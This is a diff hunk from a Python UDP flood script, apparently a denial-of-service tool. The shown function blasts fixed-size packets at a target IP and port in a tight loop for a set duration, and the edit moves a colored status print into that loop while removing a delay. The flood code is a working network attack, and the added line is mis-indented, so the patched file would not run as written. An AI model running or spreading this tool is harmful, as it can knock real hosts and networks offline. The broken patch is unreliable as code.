@@ -27,17 +27,15 @@ def udp_plain_flood(ip, port, duration, packet_size):
     payload = b"A" * packet_size  # Fixed payloaf
         
     print(Fore.LIGHTBLUE_EX + f"[*] Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
-    time.sleep(0.2)
-    
     try:
         while time.time() < end_time:
+        print("\033[103m \033[44m0bject \033[0m \033[33m" +str(ip)+ " \033[32m0k..!\033[0m")
             sock.sendto(payload, (ip, port))
             packet_count += 1
     except Exception as e:
         print(Fore.LIGHTRED_EX + f"[!] Error during UDP Plain flood: {e}")
     finally:
         sock.close()
-        print("\033[103m \033[44m0bject \033[0m \033[33m" +str(ip)+ " \033[32m0k..!\033[0m")
         print(Fore.LIGHTGREEN_EX + f"[+] UDP Plain flood complete! Sent {packet_count} packets.")
 
 def udp_random_flood(ip, port, duration, packet_size):
